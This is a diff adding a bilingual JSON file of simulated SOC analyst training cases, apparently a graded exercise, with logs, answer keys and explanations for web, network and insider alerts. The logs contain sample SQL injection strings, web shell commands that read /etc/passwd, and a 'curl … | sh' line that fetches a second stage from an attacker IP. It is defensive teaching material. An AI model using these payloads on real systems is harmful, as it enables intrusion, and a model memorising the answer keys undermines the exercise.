@@ -1,0 +1,720 @@
+{
+  "id": "T4",
+  "dia": {
+    "es": "Jueves",
+    "en": "Thursday"
+  },
+  "tema": {
+    "es": "Red y aplicaciones web",
+    "en": "Network and web apps"
+  },
+  "casos": [
+    {
+      "id": "T4-01",
+      "hora": "08:10",
+      "sev": "media",
+      "fuente": "WAF",
+      "regla": {
+        "es": "Firmas de inyección SQL",
+        "en": "SQL injection signatures"
+      },
+      "titulo": {
+        "es": "Intentos de inyección SQL contra el portal de clientes",
+        "en": "SQL injection attempts against the customer portal"
+      },
+      "resumen": {
+        "es": "El WAF registra peticiones con UNION SELECT y comillas contra /pedidos.",
+        "en": "The WAF logs requests with UNION SELECT and quotes against /pedidos."
+      },
+      "logs": [
+        [
+          "08:05:11",
+          "waf",
+          "block GET /pedidos?id=1' OR '1'='1 from 198.51.100.200 rule=942100 status=403"
+        ],
+        [
+          "08:05:12",
+          "waf",
+          "block GET /pedidos?id=1 UNION SELECT usuario,clave FROM clientes-- from 198.51.100.200 rule=942190 status=403"
+        ],
+        [
+          "08:06:30",
+          "waf",
+          "summary src=198.51.100.200 requests=212 blocked=212 status_200=0 ua='sqlmap/1.8'"
+        ],
+        [
+          "08:07:00",
+          "web-SRV-WEB01",
+          "sin peticiones de 198.51.100.200 en el servidor de aplicaciones (todas paradas en el WAF)"
+        ]
+      ],
+      "ruido": {
+        "fuentes": [
+          "waf",
+          "web"
+        ],
+        "n": 12
+      },
+      "veredicto": "vp",
+      "accion": "cerrar",
+      "campos": [
+        {
+          "id": "estado",
+          "label": {
+            "es": "Código HTTP que recibió el atacante",
+            "en": "HTTP status the attacker got"
+          },
+          "ok": [
+            "403"
+          ]
+        },
+        {
+          "id": "herramienta",
+          "label": {
+            "es": "Herramienta que usa",
+            "en": "Tool being used"
+          },
+          "ok": [
+            "sqlmap"
+          ]
+        }
+      ],
+      "mitre": "T1190",
+      "claves": [
+        "198.51.100.200",
+        "403",
+        "sqlmap"
+      ],
+      "competencias": [
+        "triaje",
+        "red",
+        "logs"
+      ],
+      "explica": {
+        "es": "Es un ataque real con sqlmap (verdadero positivo), pero las 212 peticiones recibieron 403 y ninguna llegó al servidor. El control funcionó: se documenta, se bloquea la IP si la política lo pide y se cierra. Lo que obligaría a escalar es un solo 200 con firma de inyección.",
+        "en": "It is a real sqlmap attack (true positive), but all 212 requests got 403 and none reached the server. The control worked: document it, block the IP if policy says so, and close. What would force an escalation is a single 200 with an injection signature."
+      }
+    },
+    {
+      "id": "T4-02",
+      "hora": "08:55",
+      "sev": "critica",
+      "fuente": "WAF",
+      "regla": {
+        "es": "Ejecución de comandos en parámetro web",
+        "en": "Command execution in a web parameter"
+      },
+      "titulo": {
+        "es": "Un fichero subido responde a comandos del sistema",
+        "en": "An uploaded file answers system commands"
+      },
+      "resumen": {
+        "es": "Peticiones con ?cmd= a un .php dentro de /uploads/ devuelven 200.",
+        "en": "Requests with ?cmd= to a .php under /uploads/ return 200."
+      },
+      "logs": [
+        [
+          "08:49:02",
+          "web-SRV-WEB01",
+          "203.0.113.150 - - \"POST /perfil/avatar HTTP/1.1\" 200 512 file=avatar.php content-type=image/png"
+        ],
+        [
+          "08:50:40",
+          "web-SRV-WEB01",
+          "203.0.113.150 - - \"GET /uploads/avatar.php?cmd=whoami HTTP/1.1\" 200 21"
+        ],
+        [
+          "08:51:15",
+          "web-SRV-WEB01",
+          "203.0.113.150 - - \"GET /uploads/avatar.php?cmd=cat%20/etc/passwd HTTP/1.1\" 200 1840"
+        ],
+        [
+          "08:53:02",
+          "edr",
+          "process=sh parent=php-fpm user=www-data host=SRV-WEB01 cmd='curl -s http://203.0.113.150/k | sh'"
+        ]
+      ],
+      "ruido": {
+        "fuentes": [
+          "web",
+          "waf"
+        ],
+        "n": 12
+      },
+      "veredicto": "vp",
+      "accion": "contener",
+      "campos": [
+        {
+          "id": "ruta",
+          "label": {
+            "es": "Ruta del web shell",
+            "en": "Web shell path"
+          },
+          "ok": [
+            "/uploads/avatar.php"
+          ]
+        },
+        {
+          "id": "ip",
+          "label": {
+            "es": "IP del atacante",
+            "en": "Attacker IP"
+          },
+          "ok": [
+            "203.0.113.150"
+          ]
+        }
+      ],
+      "mitre": "T1505.003",
+      "claves": [
+        "/uploads/avatar.php",
+        "203.0.113.150"
+      ],
+      "competencias": [
+        "triaje",
+        "red",
+        "logs",
+        "respuesta"
+      ],
+      "explica": {
+        "es": "El formulario de avatar aceptó un .php declarado como imagen, y ahora ese fichero ejecuta comandos (200 con contenido) y ya descarga una segunda fase. Es un web shell activo en el servidor público: contener aislando SRV-WEB01 o retirándolo del balanceador, bloquear la IP y escalar como incidente.",
+        "en": "The avatar form accepted a .php declared as an image, and now that file runs commands (200 with content) and is already pulling a second stage. It is a live web shell on the public server: contain by isolating SRV-WEB01 or pulling it from the load balancer, block the IP and escalate as an incident."
+      }
+    },
+    {
+      "id": "T4-03",
+      "hora": "09:35",
+      "sev": "media",
+      "fuente": "SIEM",
+      "regla": {
+        "es": "Escaneo interno de puertos",
+        "en": "Internal port scan"
+      },
+      "titulo": {
+        "es": "Un equipo interno recorre toda la red",
+        "en": "An internal host sweeps the whole network"
+      },
+      "resumen": {
+        "es": "10.20.5.15 conecta con 250 equipos y miles de puertos.",
+        "en": "10.20.5.15 touches 250 hosts and thousands of ports."
+      },
+      "logs": [
+        [
+          "07:00:00",
+          "itsm",
+          "CHG-2090 aprobado: escaneo trimestral de vulnerabilidades · origen SCAN-01 (10.20.5.15) · alcance 10.20.0.0/16 · ventana 07:00-12:00"
+        ],
+        [
+          "09:31:10",
+          "fw02",
+          "ALLOW tcp 10.20.5.15:44102 -> 10.20.2.0/24 ports=1-1024 count=6144"
+        ],
+        [
+          "09:33:40",
+          "win-SRV-FS01",
+          "EventID=4625 TargetUserName=svc_scan IpAddress=10.20.5.15 LogonType=3 (credencial de escaneo autenticado, contraseña rotada ayer)"
+        ],
+        [
+          "09:34:10",
+          "scan01",
+          "Nessus 10.8 scan='Trimestral Q4' status=running hosts_done=118/250"
+        ]
+      ],
+      "ruido": {
+        "fuentes": [
+          "fw",
+          "win"
+        ],
+        "n": 12
+      },
+      "veredicto": "benigno",
+      "accion": "cerrar",
+      "campos": [
+        {
+          "id": "cambio",
+          "label": {
+            "es": "Cambio que lo autoriza",
+            "en": "Change that authorises it"
+          },
+          "ok": [
+            "CHG-2090"
+          ]
+        },
+        {
+          "id": "cuenta",
+          "label": {
+            "es": "Cuenta con fallos de inicio de sesión",
+            "en": "Account with failed logons"
+          },
+          "ok": [
+            "svc_scan"
+          ]
+        }
+      ],
+      "mitre": null,
+      "claves": [
+        "CHG-2090",
+        "SCAN-01"
+      ],
+      "competencias": [
+        "triaje",
+        "red",
+        "comunicacion"
+      ],
+      "explica": {
+        "es": "Origen, alcance y ventana coinciden con CHG-2090: es el escaneo trimestral, benigno. Pero hay un detalle útil: svc_scan falla al autenticarse porque su contraseña se rotó ayer, así que el escaneo autenticado saldrá incompleto. Se cierra y se avisa a IT. Así aporta valor un buen N1.",
+        "en": "Source, scope and window match CHG-2090: it is the quarterly scan, benign. But there is a useful detail: svc_scan fails to authenticate because its password was rotated yesterday, so the credentialed scan will be incomplete. Close it and tell IT. That is how a good tier 1 adds value."
+      }
+    },
+    {
+      "id": "T4-04",
+      "hora": "10:15",
+      "sev": "alta",
+      "fuente": "SIEM",
+      "regla": {
+        "es": "Comunicación periódica (baliza)",
+        "en": "Periodic communication (beacon)"
+      },
+      "titulo": {
+        "es": "Un equipo llama a un dominio cada 60 segundos exactos",
+        "en": "A host calls a domain every 60 seconds exactly"
+      },
+      "resumen": {
+        "es": "Tráfico HTTP regular y de tamaño constante desde PC-ALM-021.",
+        "en": "Regular, constant-size HTTP traffic from PC-ALM-021."
+      },
+      "logs": [
+        [
+          "10:10:00",
+          "proxy01",
+          "user=l.moreno GET http://cdn-update.example/ping?id=7f3a 200 bytes=312 ua='Mozilla/4.0 (compatible; MSIE 6.0)'"
+        ],
+        [
+          "10:11:00",
+          "proxy01",
+          "user=l.moreno GET http://cdn-update.example/ping?id=7f3a 200 bytes=312"
+        ],
+        [
+          "10:12:00",
+          "proxy01",
+          "user=l.moreno GET http://cdn-update.example/ping?id=7f3a 200 bytes=312"
+        ],
+        [
+          "10:13:00",
+          "proxy01",
+          "user=l.moreno POST http://cdn-update.example/res?id=7f3a 200 bytes_out=48211"
+        ],
+        [
+          "10:14:00",
+          "proxy01",
+          "summary host=PC-ALM-021 domain=cdn-update.example requests=1440/24h interval=60s jitter=0"
+        ],
+        [
+          "10:14:05",
+          "dns",
+          "cdn-update.example A 198.51.100.180 · dominio creado hace 9 dias"
+        ]
+      ],
+      "ruido": {
+        "fuentes": [
+          "proxy",
+          "dns"
+        ],
+        "n": 12
+      },
+      "veredicto": "vp",
+      "accion": "contener",
+      "campos": [
+        {
+          "id": "dominio",
+          "label": {
+            "es": "Dominio de control",
+            "en": "Control domain"
+          },
+          "ok": [
+            "cdn-update.example"
+          ]
+        },
+        {
+          "id": "intervalo",
+          "label": {
+            "es": "Intervalo entre llamadas (segundos)",
+            "en": "Interval between calls (seconds)"
+          },
+          "ok": [
+            "60",
+            "60s",
+            "60 s"
+          ]
+        }
+      ],
+      "mitre": "T1071.001",
+      "claves": [
+        "cdn-update.example",
+        "60",
+        "PC-ALM-021"
+      ],
+      "competencias": [
+        "triaje",
+        "red",
+        "logs",
+        "respuesta"
+      ],
+      "explica": {
+        "es": "Una persona no navega cada 60 segundos exactos durante 24 horas con un navegador de 2001. Es la baliza del implante descargado en T3-01 en este mismo equipo, y el POST de 48 KB indica que ya envía datos. Contener: aislar PC-ALM-021 y bloquear el dominio y su IP.",
+        "en": "No human browses every 60 seconds exactly for 24 hours with a 2001 browser. It is the beacon of the implant downloaded in T3-01 on this same PC, and the 48 KB POST shows it is already sending data. Contain: isolate PC-ALM-021 and block the domain and its IP."
+      }
+    },
+    {
+      "id": "T4-05",
+      "hora": "11:05",
+      "sev": "alta",
+      "fuente": "SIEM",
+      "regla": {
+        "es": "Consultas DNS anómalas",
+        "en": "Anomalous DNS queries"
+      },
+      "titulo": {
+        "es": "Subdominios larguísimos contra un mismo dominio",
+        "en": "Very long subdomains against one domain"
+      },
+      "resumen": {
+        "es": "Miles de consultas TXT con etiquetas de casi 60 caracteres desde 10.20.3.33.",
+        "en": "Thousands of TXT queries with labels close to 60 characters from 10.20.3.33."
+      },
+      "logs": [
+        [
+          "11:01:12",
+          "dns",
+          "query TXT 4e6f6d696e61735f323032362e786c73782d70617274303031.t.exfil-data.example from 10.20.3.33"
+        ],
+        [
+          "11:01:12",
+          "dns",
+          "query TXT 0a1f9c33e2b7d4a8c6e0f1b2a3d4c5e6f7a8b9c0d1e2f3a4b5.t.exfil-data.example from 10.20.3.33"
+        ],
+        [
+          "11:03:00",
+          "dns",
+          "summary src=10.20.3.33 domain=exfil-data.example queries=6420/10m unique_subdomains=6419 avg_label_len=58"
+        ],
+        [
+          "11:03:05",
+          "note",
+          "el primer subdominio en hexadecimal se lee 'Nominas_2026.xlsx-part001'"
+        ]
+      ],
+      "ruido": {
+        "fuentes": [
+          "dns"
+        ],
+        "n": 14
+      },
+      "veredicto": "vp",
+      "accion": "contener",
+      "campos": [
+        {
+          "id": "dominio",
+          "label": {
+            "es": "Dominio usado",
+            "en": "Domain used"
+          },
+          "ok": [
+            "exfil-data.example"
+          ]
+        },
+        {
+          "id": "equipo",
+          "label": {
+            "es": "IP del equipo que consulta",
+            "en": "IP of the querying host"
+          },
+          "ok": [
+            "10.20.3.33"
+          ]
+        }
+      ],
+      "mitre": "T1048.003",
+      "claves": [
+        "exfil-data.example",
+        "10.20.3.33"
+      ],
+      "competencias": [
+        "triaje",
+        "red",
+        "logs",
+        "respuesta"
+      ],
+      "explica": {
+        "es": "Casi cada consulta es un subdominio único y codificado: los datos salen troceados dentro de las preguntas DNS, y el primero decodifica como un fichero de nóminas. 10.20.3.33 es PC-FIN-003, el equipo comprometido por la macro del martes. Contener: aislar el equipo y bloquear el dominio en el DNS.",
+        "en": "Almost every query is a unique encoded subdomain: data leaves in chunks inside DNS questions, and the first one decodes as a payroll file. 10.20.3.33 is PC-FIN-003, the PC compromised by Tuesday's macro. Contain: isolate the host and sinkhole the domain in DNS."
+      },
+      "mitreAlt": [
+        "T1071.004"
+      ]
+    },
+    {
+      "id": "T4-06",
+      "hora": "11:50",
+      "sev": "media",
+      "fuente": "Proxy",
+      "regla": {
+        "es": "Subida grande a almacenamiento personal",
+        "en": "Large upload to personal storage"
+      },
+      "titulo": {
+        "es": "3,4 GB subidos a una nube personal",
+        "en": "3.4 GB uploaded to a personal cloud"
+      },
+      "resumen": {
+        "es": "Subida de un ZIP a un servicio de almacenamiento no corporativo.",
+        "en": "A ZIP uploaded to a non-corporate storage service."
+      },
+      "logs": [
+        [
+          "11:41:00",
+          "proxy01",
+          "user=j.romero POST https://files.example/upload?name=clientes_completo_2026.zip 200 bytes_out=3.4GB category=personal_storage"
+        ],
+        [
+          "11:41:02",
+          "dlp",
+          "match file=clientes_completo_2026.zip patterns=dni,iban,email count=18402"
+        ],
+        [
+          "11:42:10",
+          "ad",
+          "j.romero baja voluntaria comunicada 2026-10-30 · ultimo dia 2026-11-14"
+        ],
+        [
+          "11:42:12",
+          "itsm",
+          "busqueda peticiones de j.romero para files.example: ninguna"
+        ]
+      ],
+      "ruido": {
+        "fuentes": [
+          "proxy"
+        ],
+        "n": 12
+      },
+      "veredicto": "vp",
+      "accion": "escalar",
+      "campos": [
+        {
+          "id": "usuario",
+          "label": {
+            "es": "Usuario",
+            "en": "User"
+          },
+          "ok": [
+            "j.romero"
+          ]
+        },
+        {
+          "id": "fichero",
+          "label": {
+            "es": "Fichero subido",
+            "en": "Uploaded file"
+          },
+          "ok": [
+            "clientes_completo_2026.zip"
+          ]
+        }
+      ],
+      "mitre": "T1567.002",
+      "claves": [
+        "j.romero",
+        "clientes_completo_2026.zip"
+      ],
+      "competencias": [
+        "triaje",
+        "red",
+        "comunicacion"
+      ],
+      "explica": {
+        "es": "Una persona que deja la empresa en dos semanas sube a su nube personal 18 402 registros de clientes con DNI e IBAN, sin ninguna petición. Es una posible fuga de datos personales con implicaciones legales y de RR. HH.: se escala a N2 con todas las evidencias. Un N1 no contiene ni contacta con la persona por su cuenta.",
+        "en": "Someone leaving the company in two weeks uploads 18,402 customer records with ID numbers and IBANs to their personal cloud, with no request on file. It is a possible personal data leak with legal and HR implications: escalate to tier 2 with all the evidence. Tier 1 neither contains nor contacts the person on their own."
+      }
+    },
+    {
+      "id": "T4-07",
+      "hora": "12:40",
+      "sev": "media",
+      "fuente": "SIEM",
+      "regla": {
+        "es": "Conexión a IP de la lista de TOR",
+        "en": "Connection to an IP on the TOR list"
+      },
+      "titulo": {
+        "es": "Tráfico hacia una IP marcada como nodo TOR",
+        "en": "Traffic to an IP flagged as a TOR node"
+      },
+      "resumen": {
+        "es": "Todos los servidores conectan con 198.51.100.9, que la fuente de amenazas marca como TOR desde hoy.",
+        "en": "Every server connects to 198.51.100.9, which the threat feed flags as TOR since today."
+      },
+      "logs": [
+        [
+          "12:30:00",
+          "ti",
+          "feed TOR-relays actualizado: +312 IP · incluye 198.51.100.9"
+        ],
+        [
+          "12:35:10",
+          "fw01",
+          "ALLOW udp 10.20.0.10:123 -> 198.51.100.9:123"
+        ],
+        [
+          "12:35:10",
+          "fw01",
+          "ALLOW udp 10.20.0.20:123 -> 198.51.100.9:123"
+        ],
+        [
+          "12:35:11",
+          "dns",
+          "198.51.100.9 PTR ntp1.proveedor-hora.example · configurado como servidor NTP en GPO 'Hora-Dominio' desde 2024"
+        ],
+        [
+          "12:36:00",
+          "ti",
+          "aviso del proveedor de la fuente: 'la actualizacion de las 12:30 incluyo por error un bloque de servidores NTP; se corregira a las 14:00'"
+        ]
+      ],
+      "ruido": {
+        "fuentes": [
+          "fw",
+          "dns"
+        ],
+        "n": 12
+      },
+      "veredicto": "fp",
+      "accion": "cerrar",
+      "campos": [
+        {
+          "id": "puerto",
+          "label": {
+            "es": "Puerto de destino",
+            "en": "Destination port"
+          },
+          "ok": [
+            "123",
+            "udp/123",
+            "123/udp"
+          ]
+        },
+        {
+          "id": "servicio",
+          "label": {
+            "es": "Servicio real de esa IP",
+            "en": "Real service at that IP"
+          },
+          "ok": [
+            "ntp"
+          ]
+        }
+      ],
+      "mitre": null,
+      "claves": [
+        "ntp",
+        "198.51.100.9"
+      ],
+      "competencias": [
+        "triaje",
+        "red",
+        "logs"
+      ],
+      "explica": {
+        "es": "El tráfico es UDP/123 hacia el servidor de hora que el dominio usa desde 2024; lo que cambió hoy fue la fuente de inteligencia, que metió esa IP por error y el proveedor ya lo ha reconocido. Falso positivo: se cierra y se propone excluir la IP hasta que llegue la corrección. Bloquearla habría desincronizado la hora del dominio y roto Kerberos.",
+        "en": "The traffic is UDP/123 to the time server the domain has used since 2024; what changed today was the intelligence feed, which added that IP by mistake, and the provider has already admitted it. False positive: close it and propose excluding the IP until the fix lands. Blocking it would have broken domain time sync and Kerberos."
+      }
+    },
+    {
+      "id": "T4-08",
+      "hora": "13:30",
+      "sev": "alta",
+      "fuente": "EDR",
+      "regla": {
+        "es": "Conexión a pool de minería",
+        "en": "Connection to a mining pool"
+      },
+      "titulo": {
+        "es": "El servidor web al 100 % de CPU",
+        "en": "The web server at 100 % CPU"
+      },
+      "resumen": {
+        "es": "Un proceso con nombre de hilo del núcleo consume toda la CPU de SRV-WEB01.",
+        "en": "A process named like a kernel thread eats all of SRV-WEB01's CPU."
+      },
+      "logs": [
+        [
+          "13:20:00",
+          "edr",
+          "process=kworkerds parent=sh user=www-data host=SRV-WEB01 path=/tmp/.x/kworkerds cpu=98%"
+        ],
+        [
+          "13:20:02",
+          "fw01",
+          "ALLOW tcp 10.20.1.15:39020 -> 203.0.113.77:3333"
+        ],
+        [
+          "13:20:05",
+          "edr",
+          "network host=SRV-WEB01 process=kworkerds payload='{\"method\":\"mining.subscribe\"}'"
+        ],
+        [
+          "13:21:00",
+          "edr",
+          "crontab www-data: '*/5 * * * * /tmp/.x/kworkerds' creado 08:54"
+        ]
+      ],
+      "ruido": {
+        "fuentes": [
+          "edr",
+          "fw"
+        ],
+        "n": 12
+      },
+      "veredicto": "vp",
+      "accion": "contener",
+      "campos": [
+        {
+          "id": "puerto",
+          "label": {
+            "es": "Puerto del pool",
+            "en": "Pool port"
+          },
+          "ok": [
+            "3333"
+          ]
+        },
+        {
+          "id": "proceso",
+          "label": {
+            "es": "Proceso malicioso",
+            "en": "Malicious process"
+          },
+          "ok": [
+            "kworkerds"
+          ]
+        }
+      ],
+      "mitre": "T1496",
+      "claves": [
+        "kworkerds",
+        "3333",
+        "SRV-WEB01"
+      ],
+      "competencias": [
+        "triaje",
+        "endpoint",
+        "red",
+        "respuesta"
+      ],
+      "explica": {
+        "es": "Los hilos del núcleo no viven en /tmp ni los lanza www-data; «mining.subscribe» al puerto 3333 es el protocolo Stratum de minería. El cron se creó a las 08:54, justo después del web shell de T4-02: es la misma intrusión. Contener: SRV-WEB01 sigue comprometido y el N2 debe saber que hay persistencia.",
+        "en": "Kernel threads do not live in /tmp nor run as www-data; «mining.subscribe» on port 3333 is the Stratum mining protocol. The cron job was created at 08:54, right after the T4-02 web shell: same intrusion. Contain: SRV-WEB01 is still compromised and tier 2 needs to know there is persistence."
+      }
+    }
+  ]
+}
